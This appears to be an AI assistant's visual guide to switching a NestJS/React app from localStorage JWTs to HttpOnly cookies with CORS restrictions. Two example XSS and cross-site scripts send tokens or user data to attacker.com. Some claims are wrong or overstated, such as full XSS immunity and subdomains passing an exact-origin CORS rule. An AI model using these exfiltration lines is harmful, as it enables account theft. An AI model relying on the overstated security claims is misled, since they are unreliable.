# Cookie-Based Authentication - Visual Guide

## Your Question Explained Visually

### Question
> "I don't want to store tokens in localStorage. Use cookies instead. And only my frontend URL should access this server."

---

## Flow Comparison

### BEFORE (Current - Tokens in Response Body)

```
┌──────────────────────────────────────────────────────────────┐
│ YOUR FRONTEND (React)                                        │
│ ┌────────────────────────────────────────────────────────┐  │
│ │ 1. User enters email & password                        │  │
│ │ 2. Click "Login" button                                │  │
│ │ 3. Send POST /auth/login                              │  │
│ └────────────────────────────────────────────────────────┘  │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   │ POST /auth/login
                   │ {email: "user@example.com", password: "secure"}
                   │
                   ▼
┌──────────────────────────────────────────────────────────────┐
│ YOUR BACKEND (NestJS)                                        │
│ ┌────────────────────────────────────────────────────────┐  │
│ │ 1. Check email & password ✅                          │  │
│ │ 2. Generate JWT tokens                                │  │
│ │ 3. Return in Response Body                            │  │
│ └────────────────────────────────────────────────────────┘  │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   │ {
                   │   "accessToken": "eyJhbGc...",
                   │   "refreshToken": "eyJhbGc...",
                   │   "user": {email: "user@example.com"}
                   │ }
                   │
                   ▼
┌──────────────────────────────────────────────────────────────┐
│ YOUR FRONTEND (React)                                        │
│ ┌────────────────────────────────────────────────────────┐  │
│ │ 4. Receive tokens from response                        │  │
│ │ 5. Store in localStorage ❌                            │  │
│ │    localStorage.setItem('token', accessToken)         │  │
│ │ 6. Problem: JavaScript can access localStorage!       │  │
│ │    XSS attack → steal token                           │  │
│ └────────────────────────────────────────────────────────┘  │
│                                                              │
│ ┌────────────────────────────────────────────────────────┐  │
│ │ NEXT REQUEST: GET /users/me                            │  │
│ │ 7. Read token from localStorage                        │  │
│ │ 8. Add to header: Authorization: Bearer xxx           │  │
│ │ 9. Send request                                        │  │
│ └────────────────────────────────────────────────────────┘  │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   │ GET /users/me
                   │ Authorization: Bearer eyJhbGc...
                   │
                   ▼
┌──────────────────────────────────────────────────────────────┐
│ YOUR BACKEND (NestJS)                                        │
│ ┌────────────────────────────────────────────────────────┐  │
│ │ Verify token                                           │  │
│ │ Return user data                                       │  │
│ └────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────┘

VULNERABILITY: 🔓 XSS Attack
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Attacker injects malicious script:
<script>
  const token = localStorage.getItem('token');  // ❌ Accessible
  fetch('http://attacker.com?stolen=' + token);
</script>

Result: Token stolen, account compromised!
```

---

### AFTER (New - Tokens in HTTP-Only Cookies)

```
┌──────────────────────────────────────────────────────────────┐
│ YOUR FRONTEND (React)                                        │
│ ┌────────────────────────────────────────────────────────┐  │
│ │ 1. User enters email & password                        │  │
│ │ 2. Click "Login" button                                │  │
│ │ 3. Send POST /auth/login                              │  │
│ │    WITH: credentials: 'include'                        │  │
│ └────────────────────────────────────────────────────────┘  │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   │ POST /auth/login
                   │ {email: "user@example.com", password: "secure"}
                   │ credentials: 'include'
                   │
                   ▼
┌──────────────────────────────────────────────────────────────┐
│ YOUR BACKEND (NestJS)                                        │
│ ┌────────────────────────────────────────────────────────┐  │
│ │ 1. Check email & password ✅                          │  │
│ │ 2. Generate JWT tokens                                │  │
│ │ 3. SET COOKIES in response:                           │  │
│ │    Set-Cookie: accessToken=eyJhbGc...;                │  │
│ │    Set-Cookie: refreshToken=eyJhbGc...;               │  │
│ │ 4. Return user data (NO tokens in body)               │  │
│ └────────────────────────────────────────────────────────┘  │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   │ Set-Cookie: accessToken=eyJhbGc...;
                   │             HttpOnly; Secure; SameSite=Strict
                   │ Set-Cookie: refreshToken=eyJhbGc...;
                   │             HttpOnly; Secure; SameSite=Strict
                   │
                   │ Body: {
                   │   "success": true,
                   │   "user": {email: "user@example.com"}
                   │ }
                   │
                   ▼
┌──────────────────────────────────────────────────────────────┐
│ YOUR FRONTEND (React)                                        │
│ ┌────────────────────────────────────────────────────────┐  │
│ │ 4. Browser receives response                           │  │
│ │ 5. Browser auto-stores cookies ✅                      │  │
│ │    (Developer does nothing!)                           │  │
│ │ 6. JavaScript CANNOT access HTTP-Only cookies          │  │
│ │    localStorage.getItem('token') → undefined          │  │
│ │ 7. No XSS vulnerability! ✅                           │  │
│ └────────────────────────────────────────────────────────┘  │
│                                                              │
│ ┌────────────────────────────────────────────────────────┐  │
│ │ NEXT REQUEST: GET /users/me                            │  │
│ │ 8. Send request:                                       │  │
│ │    WITH: credentials: 'include'                        │  │
│ │ 9. Browser auto-adds cookies (HTTP-Only)               │  │
│ │    Developer doesn't manually add headers!             │  │
│ └────────────────────────────────────────────────────────┘  │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   │ GET /users/me
                   │ (Browser automatically sends cookies)
                   │ Cookie: accessToken=eyJhbGc...
                   │ Cookie: refreshToken=eyJhbGc...
                   │
                   ▼
┌──────────────────────────────────────────────────────────────┐
│ YOUR BACKEND (NestJS)                                        │
│ ┌────────────────────────────────────────────────────────┐  │
│ │ Read token from cookies ✅                            │  │
│ │ Verify token                                           │  │
│ │ Return user data                                       │  │
│ └────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────┘

PROTECTION: 🔒 XSS Resistant
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Attacker tries to inject malicious script:
<script>
  const token = localStorage.getItem('token');  // undefined (no storage)
  const token = document.cookie;                 // ❌ HTTP-Only, empty
  const token = fetch('...').then(r => r.text()); // ❌ HTTP-Only, not in response
</script>

Result: Token cannot be stolen! Account protected! ✅
```

---

## Key Differences Summary

### BEFORE (Tokens in Body)
```
Login Response:
┌─────────────────────────────────────┐
│ {                                   │
│   "accessToken": "eyJhbGc...",      │ ← In JSON body
│   "refreshToken": "eyJhbGc...",     │ ← In JSON body
│   "user": {...}                     │
│ }                                   │
└─────────────────────────────────────┘
                 │
                 ▼
Frontend stores in localStorage ← JavaScript can access ❌
                 │
                 ▼
Next request: Add Authorization header manually ← More work

XSS Risk: ❌ JavaScript can steal tokens
CSRF Risk: ❌ No built-in protection
```

### AFTER (Tokens in Cookies)
```
Login Response:
┌─────────────────────────────────────┐
│ Set-Cookie: accessToken=eyJhbGc...; │ ← In HTTP header
│             HttpOnly; Secure;       │
│ Set-Cookie: refreshToken=eyJhbGc..;│ ← In HTTP header
│             HttpOnly; Secure;       │
│                                     │
│ {                                   │
│   "success": true,                  │ ← No tokens in body
│   "user": {...}                     │
│ }                                   │
└─────────────────────────────────────┘
                 │
                 ▼
Browser auto-stores cookies ← JavaScript CANNOT access ✅
                 │
                 ▼
Next request: Cookies auto-sent ← Less work

XSS Risk: ✅ JavaScript cannot steal tokens
CSRF Risk: ✅ Built-in protection (SameSite)
```

---

## "Only Your Frontend URL" - CORS Protection

### Attack Scenario: Without CORS Restriction

```
EVIL WEBSITE (attacker.com) TRIES TO CALL YOUR API
═════════════════════════════════════════════════════════════

User visits: https://attacker.com
Browser loads page with:

<button onclick="stealData()">Click me!</button>
<script>
  function stealData() {
    // Attacker's code runs in user's browser
    // User's cookies are stored for myapp.com

    fetch('https://myapp.com/api/users/me', {
      credentials: 'include'  // Cookies sent! ❌
    })
    .then(r => r.json())
    .then(data => {
      // Send stolen data to attacker
      fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
    });
  }
</script>

Result: User's data stolen!
```

### With CORS Restriction (NOW)

```
YOUR FRONTEND (myapp.com) CALLS YOUR API
═════════════════════════════════════════════════════════════

Backend config:
app.enableCors({
  origin: 'https://myapp.com',  ← Only this domain
  credentials: true,             ← Allow cookies
});

ALLOWED REQUESTS:
✅ https://myapp.com → https://api.myapp.com (same domain family)
✅ https://app.myapp.com → https://api.myapp.com (subdomain of same domain)

BLOCKED REQUESTS:
❌ https://attacker.com → https://api.myapp.com (different domain)
   Error: CORS policy: credentials mode is 'include' but Access-Control-Allow-Credentials header missing

Result: Evil websites CANNOT steal data!
```

---

## File Changes Overview

### 3 Backend Files to Update

```
┌─────────────────────────────────────────────────────────────┐
│ Backend Changes (30 minutes)                                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│ 1. src/main.ts                                              │
│    ├─ import cookieParser                                  │
│    ├─ app.use(cookieParser())                             │
│    └─ app.enableCors({                                    │
│         origin: 'https://myapp.com',                      │
│         credentials: true                                 │
│       })                                                   │
│                                                             │
│ 2. src/auth/auth.controller.ts                              │
│    ├─ Add @Res() response parameter                        │
│    ├─ res.cookie('accessToken', token, {...})             │
│    ├─ res.cookie('refreshToken', token, {...})            │
│    └─ res.clearCookie('accessToken/refreshToken')         │
│                                                             │
│ 3. src/common/guards/jwt.guard.ts                           │
│    ├─ Read from request.cookies.accessToken               │
│    ├─ Extract token from cookies (not header)             │
│    └─ Verify token                                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 2 Frontend Files to Update

```
┌─────────────────────────────────────────────────────────────┐
│ Frontend Changes (1-2 hours)                                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│ 1. API Configuration File                                   │
│    ├─ Remove: localStorage usage                           │
│    ├─ Add: credentials: 'include' to all requests          │
│    └─ Remove: Authorization header manually added          │
│                                                             │
│ 2. React Components (Login, Protected Routes)               │
│    ├─ Remove: localStorage.setItem('token', ...)          │
│    ├─ Remove: localStorage.getItem('token')                │
│    ├─ Remove: headers with Authorization                   │
│    └─ Add: credentials: 'include' to fetch calls          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Cookie Properties Explained

```
Set-Cookie: accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
            ┌────────────────────────────────────────────────┐
            │ Name = "accessToken"                           │
            │ Value = "eyJhbGc..." (the JWT token)          │
            └────────────────────────────────────────────────┘

; HttpOnly      ← JavaScript cannot access (prevents XSS)
; Secure        ← HTTPS only (prevents man-in-the-middle)
; SameSite=Strict ← Only send same-origin requests (prevents CSRF)
; Max-Age=900   ← Expires in 15 minutes (900 seconds)
; Path=/        ← Available on all paths
; Domain=.myapp.com ← Available on all subdomains
```

---

## HTTP Requests Comparison

### BEFORE (Tokens in Header)

```
GET /users/me HTTP/1.1
Host: api.myapp.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
                      ↑
                      Token manually added by frontend
```

### AFTER (Tokens in Cookies)

```
GET /users/me HTTP/1.1
Host: api.myapp.com
Cookie: accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
        ↑
        Browser auto-adds cookie!
```

---

## Implementation Timeline

```
IMPLEMENTATION PLAN
═════════════════════════════════════════════════════════════

BACKEND (30 minutes)
─────────────────────
[████████░░░░░░░░░░] 50% - Parse cookies
[████████░░░░░░░░░░] 50% - Set cookies in response
[████████░░░░░░░░░░] 50% - Update JWT guard
[████████░░░░░░░░░░] 50% - Configure CORS

FRONTEND (1-2 hours)
─────────────────────
[██░░░░░░░░░░░░░░░░] 10% - Update API client
[██░░░░░░░░░░░░░░░░] 10% - Update login component
[██░░░░░░░░░░░░░░░░] 10% - Update protected routes
[██░░░░░░░░░░░░░░░░] 10% - Remove localStorage
[██░░░░░░░░░░░░░░░░] 10% - Update logout flow

TESTING (30 minutes)
─────────────────────
[██████░░░░░░░░░░░░] 30% - Test login
[██████░░░░░░░░░░░░] 30% - Test cookies
[██████░░░░░░░░░░░░] 30% - Test CORS

TOTAL TIME: 2-3 hours
```

---

## Security Benefits Summary

```
┌─────────────────────────────────────────────────────────────┐
│ BEFORE: Tokens in Response Body                             │
├─────────────────────────────────────────────────────────────┤
│ ❌ XSS Risk: JavaScript can steal tokens                   │
│ ❌ CSRF Risk: No built-in protection                       │
│ ⚠️  Manual headers: Developer must add Authorization        │
│ ⚠️  localStorage: Extra attack surface                      │
│ ✅ Works on all platforms (mobile, web, etc)               │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ AFTER: Tokens in HTTP-Only Cookies                          │
├─────────────────────────────────────────────────────────────┤
│ ✅ XSS Safe: JavaScript cannot access HTTP-Only cookies    │
│ ✅ CSRF Safe: SameSite attribute prevents CSRF             │
│ ✅ Auto headers: Browser automatically sends cookies        │
│ ✅ No storage: No localStorage attack surface               │
│ ✅ Works on all platforms (mobile, web, etc)               │
│ ✅ Production-grade security ⭐                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Ready to Implement?

This plan covers:
- ✅ Detailed explanation of changes
- ✅ Backend implementation steps
- ✅ Frontend implementation examples
- ✅ Security comparisons
- ✅ Troubleshooting guide
- ✅ Production recommendations

**Next Step**: Should I proceed with implementing these changes in your actual code files?
